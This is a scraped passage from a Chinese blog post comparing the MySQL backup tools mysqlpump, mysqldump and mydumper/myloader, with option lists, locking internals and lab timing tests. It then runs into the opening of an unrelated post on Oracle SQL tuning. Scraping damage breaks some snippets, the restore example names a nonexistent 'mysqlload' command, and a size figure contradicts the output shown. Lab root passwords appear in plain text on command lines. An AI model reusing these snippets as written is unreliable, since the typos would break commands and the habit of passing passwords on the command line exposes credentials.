18：–log-error-file：备份出现的warnings和erros信息输出到一个指定的文件。 19：–max-allowed-packet：备份时用于client/server直接通信的最大buffer包的大小。 20：–net-buffer-length：备份时用于client/server通信的初始buffer大小，当创建多行插入语句的时候，mysqlpump 创建行到N个字节长。 21：–no-create-db：备份不写CREATE DATABASE语句。要是备份多个库，需要使用参数-B，而使用-B的时候会出现create database语句，该参数可以屏蔽create database 语句。 22：–no-create-info：备份不写建表语句，即不备份表结构，只备份数据，-t。 23：–hex-blob： 备份binary字段的时候使用十六进制计数法，受影响的字段类型有BINARY、VARBINARY、BLOB、BIT。 24：–host ：备份指定的数据库地址，-h。 25：–parallel-schemas=[N:]db_list：指定并行备份的库，多个库用逗号分隔，如果指定了N，将使用N个线程的地队列，如果N不指定，将由 –default-parallelism才确认N的值，可以设置多个–parallel-schemas。 1234mysqlpump --parallel-schemas=4:vs,aa --parallel-schemas=3:pt #4个线程备份vs和aa，3个线程备份pt。通过show processlist 可以看到有7个线程。mysqlpump --parallel-schemas=vs,abc --parallel-schemas=pt #默认2个线程，即2个线程备份vs和abc，2个线程备份pt####当然要是硬盘IO不允许的话，可以少开几个线程和数据库进行并行备份 26：–password：备份需要的密码。 27：–port ：备份数据库的端口。 28：–protocol={TCP|SOCKET|PIPE|MEMORY}：指定连接服务器的协议。 29：–replace：备份出来replace into语句。 30：–routines：备份出来包含存储过程和函数，默认开启，需要对 mysql.proc表有查看权限。生成的文件中会包含CREATE PROCEDURE 和 CREATE FUNCTION语句以用于恢复，关闭则需要用–skip-routines参数。 31：–triggers：备份出来包含触发器，默认开启，使用–skip-triggers来关闭。 31：–set-charset：备份文件里写SET NAMES default_character_set 到输出，此参默认开启。 – skip-set-charset禁用此参数，不会在备份文件里面写出set names… 32：–single-transaction：该参数在事务隔离级别设置成Repeatable Read，并在dump之前发送start transaction 语句给服务端。这在使用innodb时很有用，因为在发出start transaction时，保证了在不阻塞任何应用下的一致性状态。对myisam和memory等非事务表，还是会改变状态的，当使用此参的时候要确保没有其他连接在使用ALTER TABLE、CREATE TABLE、DROP TABLE、RENAME TABLE、TRUNCATE TABLE等语句，否则会出现不正确的内容或则失败。–add-locks和此参互斥，在mysql5.7.11之前，–default-parallelism大于1的时候和此参也互斥，必须使用–default-parallelism=0。5.7.11之后解决了–single-transaction和–default-parallelism的互斥问题。 33：–skip-definer：忽略那些创建视图和存储过程用到的 DEFINER 和 SQL SECURITY 语句，恢复的时候，会使用默认值，否则会在还原的时候看到没有DEFINER定义时的账号而报错。 34：–skip-dump-rows：只备份表结构，不备份数据，-d。注意：mysqldump支持–no-data，mysqlpump不支持–no-data 35：–socket：对于连接到localhost，Unix使用套接字文件，在Windows上是命名管道的名称使用，-S。 36：–ssl：–ssl参数将要被去除，用–ssl-mode取代。关于ssl相关的备份，请看官方文档。 37：–tz-utc：备份时会在备份文件的最前几行添加SET TIME_ZONE=’+00:00’。注意：如果还原的服务器不在同一个时区并且还原表中的列有timestamp字段，会导致还原出来的结果不一致。默认开启该参数，用 –skip-tz-utc来关闭参数。 38：–user：备份时候的用户名，-u。 39：–users：备份数据库用户，备份的形式是CREATE USER…，GRANT…，只备份数据库账号可以通过如下命令： mysqlpump –exclude-databases=% –users #过滤掉所有数据库 40：–watch-progress：定期显示进度的完成，包括总数表、行和其他对象。该参数默认开启，用–skip-watch-progress来关闭。 使用说明mysqlpump的架构如下图所示： mysqlpump支持基于库和表的并行导出，mysqlpump的并行导出功能的架构为：队列+线程，允许有多个队列（–parallel-schemas？），每个队列下有多个线程（N？），而一个队列可以绑定1个或者多个数据库（逗号分隔）。mysqlpump的备份是基于表并行的，对于每张表的导出只能是单个线程的，这里会有个限制是如果某个数据库有一张表非常大，可能大部分的时间都是消耗在这个表的备份上面，并行备份的效果可能就不明显。这里可以利用mydumper其是以chunk的方式批量导出，即mydumper支持一张表多个线程以chunk的方式批量导出。但是相对于mysqldump还是有了很大的提升。这里大致测试下mysqlpump和mysqldump的备份效率。 1234567891011#mysqlpump压缩备份vs数据库 三个并发线程备份，消耗时间：222smysqlpump -uzjy -p -h192.168.123.70 --single-transaction --default-character-set=utf8 --compress-output=LZ4 --default-parallelism=3 -B vs &gt; /home/zhoujy/vs_db.sql.lz4#mysqldump备份压缩vs数据库 单个线程备份，消耗时间：900s，gzip的压缩率比LZ4的高mysqldump -uzjy -p -h192.168.123.70 --default-character-set=utf8 -P3306 --skip-opt --add-drop-table --create-options --quick --extended-insert --single-transaction -B vs | gzip &gt; /home/zhoujy/vs.sql.gz#mydumper备份vs数据库 三个并发线程备份，消耗时间：300s，gzip的压缩率比LZ4的高mydumper -u zjy -p -h 192.168.123.70 -P 3306 -t 3 -c -l 3600 -s 10000000 -B vs -o /home/zhoujy/vs/#mydumper备份vs数据库，五个并发线程备份，并且开启对一张表多个线程以chunk的方式批量导出，-r。消耗时间：180smydumper -u zjy -p -h 192.168.123.70 -P 3306 -t 5 -c -r 300000 -l 3600 -s 10000000 -B vs -o /home/zhoujy/vs/ 从上面看出，mysqlpump的备份效率是最快的，mydumper次之，mysqldump最差。所以在IO允许的情况下，能用多线程就别用单线程备份。并且mysqlpump还支持多数据库的并行备份，而mydumper要么备份一个库，要么就备份所有库。姜大神的Oracle官方并行逻辑备份工具mysqlpump这篇文章的测试结果也说明了mysqlpump比mysqldump的测试好。由于实际情况不同，测试给出的速度提升只是参考。到底开启多少个并行备份的线程，这个看磁盘IO的承受能力，若该服务器只进行备份任务，可以最大限制的来利用磁盘。 总结： mysqldump和mysqlpump的使用方法绝大部分一致，到底用那种工具备份数据库这个要在具体的环境下才能做出选择，有些时候可能用物理备份更好（xtrabackup），总之根据需要进行测试，最后再决定使用哪种备份工具进行备份。 – mydumpermydumper（&amp;myloader）是用于对MySQL数据库进行多线程备份和恢复的开源 (GNU GPLv3)工具。开发人员主要来自MySQL、Facebook和SkySQL公司，目前由Percona公司开发和维护，是PerconaRemote DBA项目的重要组成部分，包含在Percona XtraDB Cluster中。mydumper的第一版0.1发布于2010.3.26，最新版本0.9.1发布于2015.11.06。 mydumper是一种比MySQL官方mysqldump更优秀的备份工具，主要体现在多线程和备份文件保存方式上。在MySQL 5.7版本中，官方发布了一种新的备份工具mysqlpump，也是多线程的，其实现方式给人耳目一新的感觉，但遗憾的是其仍为表级别的并行。而mydumper能够实现记录级别的并行备份，其备份框架由主线程和多个工作线程组成. 这里一致性数据指的是在某个时间点，导出的数据与导出的Binlog文件信息相匹配，如果导出了多张表的数据，这些不同表之间的数据都是同一个时间点的数据。 mydumper备份原理在mydumper进行备份的时候，由一个主线程以及多个备份线程完成。其主线程的流程是： 连接数据库 FLUSH TABLES WITH READ LOCK 将脏页刷新到磁盘并获得只读锁 START TRANSACTION /!40108 WITH CONSISTENT SNAPSHOT / 开启事物并获取一致性快照 SHOW MASTER STATUS 获得binlog信息 创建子线程并连接数据库 为子线程分配任务并push到队列中 UNLOCK TABLES / FTWRL / 释放锁 子线程的主要流程是： 连接数据库 SET SESSION TRANSACTION ISOLATION LEVEL REPEATABLE START TRANSACTION /!40108 WITH CONSISTENT SNAPSHOT / 从队列中pop任务并执行 上述两个线程的流程的关系如图 从图中可以看到，主线程释放锁是在子线程开启事物之后。这里是保证子线程获得的数据一定为一致性数据的关键。 主线程在连接到数据库后立即通过Flush tables with read lock(FTWRL) 操作将脏页刷新到磁盘，并获取一个全局的只读锁，这样便可以保证在锁释放之前由主线程看到的数据是一致的。然后立即通过 Start Transaction with consistent snapshot 创建一个快照读事物，并通过 show master status获取binlog位置信息。 然后创建完成dump任务的子线程并为其分配任务。 主线程在创建子线程后通过一个异步消息队列 ready 等待子线程准备完毕。 子线程在创建后立即创建到MySQL数据库的连接，然后设置当前事务隔离级别为Repeatable Read。 设置完成之后开始快照读事务。在完成这一系列操作之后，子线程才会通过ready队列告诉主线自己程准备完毕。主线程等待全部子线程准备完毕开启一致性读Snapshot事务后才会释放全局只读锁（Unlock Table）。 如果只有Innodb表，那么只有在创建任务阶段会加锁。但是如果存在MyIsam表或其他不带有MVCC功能的表，那么在这些表的导出任务完成之前都必须对这些表进行加锁。Mydumper本身维护了一个 non_innodb_table 列表，在创建任务阶段会首先为非Innodb表创建任务。同时还维护了一个全局的unlock_table队列以及一个原子计数器 non_innodb_table_counter , 子线程每完成一个非Innodb表的任务便将 non_innodb_table_counter 减一，如果non_innodb_table_counter 值为0 遍通过向 unlock_table 队列push一个消息的方式通知主线程完成了非Innodb表的导出任务可以执行 unlock table操作。 mydumper支持记录级别的并发导出。在记录级别的导出时，主线程在做任务分配的时候会对表进行拆分，为表的一部分记录创建一个任务。这样做一个好处就是当有某个表特别大的时候可以尽可能的利用多线程并发以免某个线程在导出一个大表而其他线程处于空闲状态。在分割时，首先选取主键（PRIMARY KEY）作为分隔依据，如果没有主键则查找有无唯一索引(UNIQUE KEY)。在以上尝试都失败后，再选取一个区分度比较高的字段做为记录划分的依据(通过 show index 结果集中的cardinality的值确定)。 划分的方式比较暴力，直接通过 select min(filed),max(filed) from table 获得划分字段的取值范围，通过 explain select filed from table 获取字段记录的行数，然后通过一个确定的步长获得每一个子任务的执行时的where条件。这种计算方式只支持数字类型的字段。 以上就是mydumper的并发获取一致性数据的方式，其关键在于利用了Innodb表的MVCC功能，可以通过快照读因此只有在任务创建阶段才需要加锁。 mydumper 参数1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636401-B, --database 要备份的数据库，不指定则备份所有库02.-T, --tables-list 需要备份的表，名字用逗号隔开03.-o, --outputdir 备份文件输出的目录04.-s, --statement-size 生成的insert语句的字节数，默认100000005.-r, --rows 将表按行分块时，指定的块行数，指定这个选项会关闭 --chunk-filesize06.-F, --chunk-filesize 将表按大小分块时，指定的块大小，单位是 MB07.-c, --compress 压缩输出文件08.-e, --build-empty-files 如果表数据是空，还是产生一个空文件（默认无数据则只有表结构文件）09.-x, --regex 是同正则表达式匹配 &apos;db.table&apos;10.-i, --ignore-engines 忽略的存储引擎，用都厚分割11.-m, --no-schemas 不备份表结构12.-k, --no-locks 不使用临时共享只读锁，使用这个选项会造成数据不一致13.--less-locking 减少对InnoDB表的锁施加时间（这种模式的机制下文详解）14.-l, --long-query-guard 设定阻塞备份的长查询超时时间，单位是秒，默认是60秒（超时后默认mydumper将会退出）15.--kill-long-queries 杀掉长查询 (不退出)16.-b, --binlogs 导出binlog17.-D, --daemon 启用守护进程模式，守护进程模式以某个间隔不间断对数据库进行备份18.-I, --snapshot-interval dump快照间隔时间，默认60s，需要在daemon模式下19.-L, --logfile 使用的日志文件名(mydumper所产生的日志), 默认使用标准输出20.--tz-utc 跨时区是使用的选项，不解释了21.--skip-tz-utc 同上22.--use-savepoints 使用savepoints来减少采集metadata所造成的锁时间，需要 SUPER 权限23.--success-on-1146 Not increment error count and Warning instead of Critical in case of table doesn&apos;t exist24.-h, --host 连接的主机名25.-u, --user 备份所使用的用户26.-p, --pass&lt;a href=&quot;http://www.it165.net/edu/ebg/&quot; target=&quot;_blank&quot;class=&quot;keylink&quot;&gt;word&lt;/a&gt; 密码27.-P, --port 端口28.-S, --socket 使用socket通信时的socket文件29.-t, --threads 开启的备份线程数，默认是430.-C, --compress-protocol 压缩与mysql通信的数据31.-V, --version 显示版本号32.-v, --verbose 输出信息模式, 0 = silent, 1 = errors, 2 = warnings, 3= info, 默认为 2 myloader 参数1234567891011121314151617181920212223242526272801-d, --directory 备份文件的文件夹02.-q, --queries-per-transaction 每次事物执行的查询数量，默认是100003.-o, --overwrite-tables 如果要恢复的表存在，则先drop掉该表，使用该参数，需要备份时候要备份表结构04.-B, --database 需要还原的数据库05.-e, --enable-binlog 启用还原数据的二进制日志06.-h, --host 主机07.-u, --user 还原的用户08.-p, --pass&lt;a href=&quot;http://www.it165.net/edu/ebg/&quot; target=&quot;_blank&quot;class=&quot;keylink&quot;&gt;word&lt;/a&gt; 密码09.-P, --port 端口10.-S, --socket socket文件11.-t, --threads 还原所使用的线程数，默认是412.-C, --compress-protocol 压缩协议13.-V, --version 显示版本14.-v, --verbose 输出模式, 0 = silent, 1 = errors, 2 = warnings,3 = info, 默认为2 使用案例123456789101112131415161718# 备份game库到/backup/01文件夹中，并压缩备份文件mydumper -u root -p ### -h localhost -B game -c -o /backup/01# 备份所有数据库，并备份二进制日志文件，备份至/backup/02文件夹mydumper -u root -p ### -h localhost -o /backup/02# 备份game.tb_player表，且不备份表结构，备份至/backup/03文件夹mydumper -u root -p ### -h localhost -T tb_player -m -o /backup/03# 还原mysqlload -u root -p ### -h localhost -B game -d /backup/02mydumper的less locking模式mydumper使用--less-locking可以减少锁等待时间，此时mydumper的执行机制大致为 mysqldump,mysqlpump,mydumper对比 虚拟机 IP地址 软件 mastera 172.25.0.11 mysql server 5.7.17 workstation 172.25.0.10 python python-matplotlib 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293[root@mastera mysql5.7]# lsmysql-5.7.17-1.el7.x86_64.rpm-bundle.tar mysql-community-libs-compat-5.7.17-1.el7.x86_64.rpmmysql-community-client-5.7.17-1.el7.x86_64.rpm mysql-community-minimal-debuginfo-5.7.17-1.el7.x86_64.rpmmysql-community-common-5.7.17-1.el7.x86_64.rpm mysql-community-server-5.7.17-1.el7.x86_64.rpmmysql-community-devel-5.7.17-1.el7.x86_64.rpm mysql-community-server-minimal-5.7.17-1.el7.x86_64.rpmmysql-community-embedded-5.7.17-1.el7.x86_64.rpm mysql-community-test-5.7.17-1.el7.x86_64.rpmmysql-community-embedded-compat-5.7.17-1.el7.x86_64.rpm sysbench-mastermysql-community-embedded-devel-5.7.17-1.el7.x86_64.rpm sysbench-master.zipmysql-community-libs-5.7.17-1.el7.x86_64.rpm[root@mastera mysql5.7]# rpm -ivh mysql-community-client-5.7.17-1.el7.x86_64.rpm mysql-community-common-5.7.17-1.el7.x86_64.rpm mysql-community-devel-5.7.17-1.el7.x86_64.rpm mysql-community-server-5.7.17-1.el7.x86_64.rpm mysql-community-libs-5.7.17-1.el7.x86_64.rpm warning: mysql-community-client-5.7.17-1.el7.x86_64.rpm: Header V3 DSA/SHA1 Signature, key ID 5072e1f5: NOKEYPreparing... ################################# [100%]Updating / installing... 1:mysql-community-common-5.7.17-1.e################################# [ 20%] 2:mysql-community-libs-5.7.17-1.el7################################# [ 40%] 3:mysql-community-client-5.7.17-1.e################################# [ 60%] 4:mysql-community-server-5.7.17-1.e################################# [ 80%] 5:mysql-community-devel-5.7.17-1.el################################# [100%][root@mastera mysql5.7]# systemctl start mysqld[root@mastera mysql5.7]# grep password /var/log/mysqld.log2017-02-09T08:32:17.515190Z 1 [Note] A temporary password is generated for root@localhost: p!hHXls+U6Po[root@mastera mysql5.7]# mysqladmin -uroot -p&apos;p!hHXls+U6Po&apos; password &apos;(Uploo00king)&apos;mysqladmin: [Warning] Using a password on the command line interface can be insecure.Warning: Since password will be sent to server in plain text, use ssl connection to ensure password safety.[root@mastera mysql5.7]# mysql -uroot -p&apos;(Uploo00king)&apos;mysql: [Warning] Using a password on the command line interface can be insecure.Welcome to the MySQL monitor. Commands end with ; or \\g.Your MySQL connection id is 4Server version: 5.7.17 MySQL Community Server (GPL)Copyright (c) 2000, 2016, Oracle and/or its affiliates. All rights reserved.Oracle is a registered trademark of Oracle Corporation and/or itsaffiliates. Other names may be trademarks of their respectiveowners.Type &apos;help;&apos; or &apos;\\h&apos; for help. Type &apos;\\c&apos; to clear the current input statement.mysql&gt; create database db1;Query OK, 1 row affected (0.00 sec)mysql&gt; use db1;Database changedmysql&gt; create table t1 (id int primary key auto_increment,num int);Query OK, 0 rows affected (0.06 sec)mysql&gt; create table t2 like t1;Query OK, 0 rows affected (0.24 sec)mysql&gt; create table t3 like t1;Query OK, 0 rows affected (0.04 sec)mysql&gt; create table t4 like t1;Query OK, 0 rows affected (0.34 sec)mysql&gt; delimiter //mysql&gt; create procedure booboo_insert (in tb_name varchar(20)) begin declare i int; declare j int; declare _sql varchar(100); set i=1; set j=10000; set _sql=concat(&apos;insert into &apos;,tb_name,&apos; set num=&apos;,i); set @sql=_sql;start transaction; prepare s2 from @sql; while i&lt;=j do execute s2; set i=i+1;end while; deallocate prepare s2; commit; end//Query OK, 0 rows affected (0.01 sec)mysql&gt; call booboo_insert(&apos;t1&apos;)//Query OK, 0 rows affected (0.71 sec)mysql&gt; call booboo_insert(&apos;t2&apos;)//Query OK, 0 rows affected (0.71 sec)mysql&gt; call booboo_insert(&apos;t3&apos;)//Query OK, 0 rows affected (0.68 sec)mysql&gt; call booboo_insert(&apos;t4&apos;)//Query OK, 0 rows affected (0.83 sec)mysql&gt; show table status;+------+--------+---------+------------+-------+----------------+-------------+-----------------+--------------+-----------+----------------+---------------------+---------------------+------------+-------------------+----------+----------------+---------+| Name | Engine | Version | Row_format | Rows | Avg_row_length | Data_length | Max_data_length | Index_length | Data_free | Auto_increment | Create_time | Update_time | Check_time | Collation | Checksum | Create_options | Comment |+------+--------+---------+------------+-------+----------------+-------------+-----------------+--------------+-----------+----------------+---------------------+---------------------+------------+-------------------+----------+----------------+---------+| t1 | InnoDB | 10 | Dynamic | 10000 | 32 | 327680 | 0 | 0 | 0 | 10002 | 2017-02-09 16:40:53 | 2017-02-09 16:43:39 | NULL | latin1_swedish_ci | NULL | | || t2 | InnoDB | 10 | Dynamic | 10000 | 32 | 327680 | 0 | 0 | 0 | 10001 | 2017-02-09 16:40:58 | 2017-02-09 16:43:59 | NULL | latin1_swedish_ci | NULL | | || t3 | InnoDB | 10 | Dynamic | 10000 | 32 | 327680 | 0 | 0 | 0 | 10001 | 2017-02-09 16:41:00 | 2017-02-09 16:44:02 | NULL | latin1_swedish_ci | NULL | | || t4 | InnoDB | 10 | Dynamic | 10000 | 32 | 327680 | 0 | 0 | 0 | 10001 | 2017-02-09 16:41:03 | 2017-02-09 16:44:05 | NULL | latin1_swedish_ci | NULL | | |+------+--------+---------+------------+-------+----------------+-------------+-----------------+--------------+-----------+----------------+---------------------+---------------------+------------+-------------------+----------+----------------+---------+4 rows in set (0.00 sec)mysql&gt; exitBye[root@mastera mysql5.7]# du -h /var/lib/mysql12M /var/lib/mysql/mysql1.1M /var/lib/mysql/performance_schema676K /var/lib/mysql/sys1.6M /var/lib/mysql/db1135M /var/lib/mysql 存储过程 该存储过程可以循环插入10000条数据，并且可以带参数（表名）调用 1234567891011121314151617create procedure booboo_insert (in tb_name varchar(20)) begin declare i int; declare j int; declare _sql varchar(100); set i=1; set j=10000; set _sql=concat(&apos;insert into &apos;,tb_name,&apos; set num=&apos;,i); set @sql=_sql;start transaction; prepare s2 from @sql; while i&lt;=j do execute s2; set i=i+1;end while; deallocate prepare s2; commit; end// 手动创建了四个测试表，我们可以看到db1库的很小才1.6M，我们来测试一下数据量比较小时，mysqldump和mysqlpump的性能 12345678910111213141516171819202122[root@mastera mysql5.7]# time mysqlpump -uroot -p&apos;(Uploo00king)&apos; db1 --default-parallelism=4 &gt; /tmp/mysql.pump4.sqlmysqlpump: [Warning] Using a password on the command line interface can be insecure.Dump progress: 0/1 tables, 250/10000 rowsDump completed in 3016 millisecondsreal 0m3.166suser 0m0.219ssys 0m0.475s[root@mastera mysql5.7]# time mysqlpump -uroot -p&apos;(Uploo00king)&apos; db1 &gt; /tmp/mysql.pump2.sqlmysqlpump: [Warning] Using a password on the command line interface can be insecure.Dump progress: 0/1 tables, 250/10000 rowsDump completed in 3703 millisecondsreal 0m3.871suser 0m0.307ssys 0m0.606s[root@mastera mysql5.7]# time mysqldump -uroot -p&apos;(Uploo00king)&apos; db1 &gt; /tmp/mysql.dump.sqlmysqldump: [Warning] Using a password on the command line interface can be insecure.real 0m0.411suser 0m0.024ssys 0m0.116s 从结果看，数据量非常小的时候没必要并行复制，mysqlpump反而更慢 接下来我们试一下数据量比较大的时候 创建sbtest库，使用sysbench压测工具准备4个1000000行的表 123456789101112131415161718mysql&gt; show table status;+---------+--------+---------+------------+--------+----------------+-------------+-----------------+--------------+-----------+----------------+---------------------+---------------------+------------+-------------------+----------+------------------+---------+| Name | Engine | Version | Row_format | Rows | Avg_row_length | Data_length | Max_data_length | Index_length | Data_free | Auto_increment | Create_time | Update_time | Check_time | Collation | Checksum | Create_options | Comment |+---------+--------+---------+------------+--------+----------------+-------------+-----------------+--------------+-----------+----------------+---------------------+---------------------+------------+-------------------+----------+------------------+---------+| sbtest1 | InnoDB | 10 | Dynamic | 986776 | 221 | 218841088 | 0 | 0 | 4194304 | 1000001 | 2017-02-09 17:03:29 | 2017-02-09 17:03:18 | NULL | latin1_swedish_ci | NULL | max_rows=1000000 | || sbtest2 | InnoDB | 10 | Dynamic | 986020 | 234 | 231456768 | 0 | 0 | 6291456 | NULL | 2017-02-09 17:06:22 | 2017-02-09 17:07:14 | NULL | latin1_swedish_ci | NULL | | || sbtest3 | InnoDB | 10 | Dynamic | 986020 | 234 | 231456768 | 0 | 0 | 6291456 | NULL | 2017-02-09 17:07:25 | 2017-02-09 17:08:11 | NULL | latin1_swedish_ci | NULL | | || sbtest4 | InnoDB | 10 | Dynamic | 986559 | 225 | 222019584 | 0 | 0 | 6291456 | NULL | 2017-02-09 17:08:24 | 2017-02-09 17:09:15 | NULL | latin1_swedish_ci | NULL | | |+---------+--------+---------+------------+--------+----------------+-------------+-----------------+--------------+-----------+----------------+---------------------+---------------------+------------+-------------------+----------+------------------+---------+4 rows in set (0.00 sec)[root@mastera sysbench-master]# du -h /var/lib/mysql12M /var/lib/mysql/mysql1.1M /var/lib/mysql/performance_schema676K /var/lib/mysql/sys1.6M /var/lib/mysql/db1937M /var/lib/mysql/sbtest1.2G /var/lib/mysql 看到当前数据库的数据达到了11G，接下来做备份 12[root@mastera ~]# time mysqldump -uroot -p&apos;(Uploo00king)&apos; sbtest --single-transaction &gt; /tmp/mysqldump.sbtest.sql[root@mastera ~]# time mysqlpump -uroot -p&apos;(Uploo00king)&apos; sbtest --single-transaction --default-parallelism=2 &gt; /tmp/mysqlpump.sbtest.sql","link":"/2017/01/05/booboo_mysql/08-MySQL-mysqldump-mysqlpump-mydumper/"},{"title":"Oracle数据库SQL优化_索引缺失","text":"摘要：Oracle数据库做了迁移，从原来的DG迁移到新库RAC，小版本不同；老库中相同的SQL执行只需要11秒，而新库需要360秒甚至800多秒，如何进行复杂查询的SQL优化，本文提供通用的一个思路。 问题描述oracle数据库做了迁移，从原来的DG迁移到新库RAC，小版本不同； 老库中相同的SQL执行只需要11秒，而新库需要360秒甚至800多秒。 库 原查询时间 优化后的查询时间 老库 11秒 1.4秒 缓存后 0.4秒 新库RAC 360秒 1.4秒 缓存后0.4秒排查思路 待优化SQL123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331SELECT prj.PROVINCE_AD_NAME, prj.CITY_AD_NAME, prj.AD_NAME, prj.CHANNEL_SYS_CAT, prj.EXCUTE_EL, prj.PRJ_CODE AS PRJ_CODE, prj.PRJ_NAME AS PRJ_NAME, prj.POS_CODE AS POS_CODE, prj.POS_NAME AS POS_NAME, prj.CUST_CHANNEL_CODE, prj.CUST_CHANNEL_NAME, prj.EMP_CODE AS EMP_CODE, prj.NAME AS EMP_NAME, prj.ATT_DATE AS APPLY_DATE, prj.EMP_PK AS EMP_PK, prj.ATT_START_TIME AS START_TIME, prj.ATT_END_TIME AS END_TIME, prj.ATT_ISWORK AS ISWORK, prj.ATT_UNWORK AS ATTTYPE, prj.START_XPOS AS ON_WORK_POSITION_LON, prj.START_YPOS AS ON_WORK_POSITION_LAT, prj.START_ISEXCEP AS ON_WORK_POSITION_STAUS, prj.END_XPOS AS OFF_WORK_POSITION_LAT, prj.END_YPOS AS OFF_WORK_POSITION_LON, prj.END_ISEXCEP AS OFF_WORK_POSITION_STAUS, ifcl1Staus.COMPARE_TYPE AS FACE_ATT_TYPE, ifcl1.STATUS AS FACE_ATT_STATUS, NVL( ifaceCount.faceCount, 0 ) AS FACE_ATT_COUNT, NVL( levLeave.LEAVECount, 0 ) AS LEAVE_WORK_COUNT, NVL( levRtn.RETURNCount, 0 ) AS RETURN_WORK_COUNT, wq.STATUS AS PRJ_QUESTION_TYPE, iface2.FACE_ATT_IMG AS FACE_ATT_IMG, prj.SA_TYPEFROM ( SELECT dpsi.ID AS ID, P.ID AS PRJ_ID, mad.AD_CODE, mad.PROVINCE_AD_NAME, mad.CITY_AD_NAME, mad.AD_NAME, mpk.POS_KIND_CODE, mpk.POS_KIND_NAME, P.CODE AS PRJ_CODE, P.NAME AS PRJ_NAME, P.START_DATE, p.END_DATE, dpsi.CUST_CHANNEL, dpsi.CUST_SYS, dpsi.CUST_CHANNEL_CODE, dpsi.CUST_CHANNEL_NAME, dcs.CHANNEL_SYS_CAT, dcs.CHANNEL_CAT_CODE, dcs.CHANNEL_AD_CODE, dcs.CHANNEL_PROVINCE_AD_CODE, dcs.CHANNEL_CITY_AD_CODE, dcs.ID AS POS_ID, dcs.CHANNEL_CODE AS POS_CODE, dcs.CHANNEL_NAME AS POS_NAME, dcs.LONGITUDE AS LONGITUDE, dcs.LATITUDE AS LATITUDE, dss.id AS SALES_ID, TO_CHAR( cal.sc_schedule_date, &apos;yyyy-mm-dd&apos; ) AS sc_schedule_date, wor.SW_BEGIN_TIME AS SALES_WORK_START, wor.SW_END_TIME AS SALES_WORK_END, dss.SALES_EAT_START, dss.SALES_EAT_END, memp.EMP_PK, memp.EMP_CODE, dss.SALES_NAME AS NAME, dss.SALES_PHONE AS TEL, dss.SALES_CARD_ID AS ID_CARD, spp.PRJ_ATT_CHECK_TYPE, spp.ALLOW_LEAVE_TIME, e1.EMP_CODE AS EXCUTE_CODE, e1.emp_name AS EXCUTE_EL, e2.EMP_CODE AS CITY_CODE, e2.emp_name AS CITY_EL, e3.EMP_CODE AS AREA_CODE, e3.EMP_NAME AS AREA_NAME, dpsi.SCHEDULE_TYPE, sac.ATT_START_TIME, sac.ATT_END_TIME, sac.ATT_ISWORK, sac.ATT_UNWORK, sac.START_XPOS, sac.START_YPOS, DECODE( sac.START_ISEXCEP, 0, 2201, 1, 2202, 2, 2203, 3, 2204, 4, 2205, 2206 ) AS START_ISEXCEP, sac.END_XPOS, sac.END_YPOS, sac.END_ISEXCEP, sac.ATT_SCH_PK, sac.ATT_DATE, CASE WHEN sac.ATT_START_TIME IS NOT NULL AND sac.ATT_END_TIME IS NOT NULL THEN &apos;1&apos; WHEN sac.ATT_START_TIME IS NOT NULL OR sac.ATT_END_TIME IS NOT NULL THEN &apos;2&apos; ELSE &apos;2&apos; END AS SA_TYPE FROM DM_PROJECT_SELLIN_INFO dpsi LEFT JOIN MD_EMP e1 ON dpsi.EMP_CODE = e1.EMP_CODE LEFT JOIN MD_EMP e2 ON dpsi.CITY_EMP_CODE = e2.EMP_CODE LEFT JOIN MD_EMP e3 ON dpsi.AREA_MANAGER_CODE = e3.EMP_CODE, DM_PROJECT P, DM_PROJECT_SELLIN_SALES dss, DM_CHANNEL_SYNC dcs, MD_EMP memp, SP_PRJ_PARM spp, Md_Admin_Div mad, MD_POS_KIND mpk, dm_sales_schedule_calendar cal, dm_sales_schedule_work wor, SP_ATT_SCH sac WHERE dpsi.PROJECT_ID = P.ID AND dss.id = cal.sales_id AND cal.schedule_work_id = wor.id AND dcs.CHANNEL_CAT_CODE = mpk.POS_KIND_CODE AND dss.PROJECT_SELLIN_INFO_ID = dpsi.ID AND dss.DELETE_FLAG = &apos;0&apos; AND dpsi.CHANNEL_SYNC_ID = dcs.ID AND LOWER( memp.EMP_S_CODE )= LOWER( dss.SALES_CARD_ID ) AND P.IS_DELETE IS NULL AND memp.IS_DEL = &apos;0&apos; AND spp.PRJ_CODE = P.CODE AND mad.AD_ID = dcs.CHANNEL_ADMIN_DIV_ID AND mad.IS_DEL = &apos;0&apos; AND memp.EMP_TYPE = &apos;1001&apos; AND TO_CHAR( cal.sc_schedule_date, &apos;yyyy-mm-dd&apos; )&gt;=&apos;2018-04-01&apos; AND TO_CHAR( cal.sc_schedule_date, &apos;yyyy-mm-dd&apos; )&lt;=&apos;2018-04-30&apos; AND sac.PRJ_CODE = p.CODE AND sac.POS_CODE = dcs.CHANNEL_CODE AND sac.EMP_PK = memp.EMP_PK AND sac.ATT_DATE = TO_CHAR( cal.sc_schedule_date, &apos;yyyy-mm-dd&apos; ) AND TO_CHAR( sac.CRT_DATE, &apos;yyyy-mm-dd&apos; )&gt;=&apos;2018-04-01&apos; AND TO_CHAR( sac.CRT_DATE, &apos;yyyy-mm-dd&apos; )&lt;=&apos;2018-04-30&apos; ) prj, ( SELECT ifcl.EMP_PK, ifcl.COMPARE_DATE, ifcl.STATUS FROM IPG_FACE_COMPARE_LOG ifcl WHERE ifcl.HANDLE_TYPE = 0 AND ifcl.DELETE_FLAG = &apos;0&apos; AND ifcl.COMPARE_TYPE IN( &apos;1&apos;, &apos;3&apos;, &apos;5&apos; ) AND ifcl.COMPARE_DATE &gt;= TO_CHAR( TO_DATE(&apos;2018-04-01&apos;, &apos;yyyy-mm-dd&apos; ), &apos;yyyymmdd&apos; ) AND ifcl.COMPARE_DATE &lt;= TO_CHAR( TO_DATE(&apos;2018-04-30&apos;, &apos;yyyy-mm-dd&apos; ), &apos;yyyymmdd&apos; ) GROUP 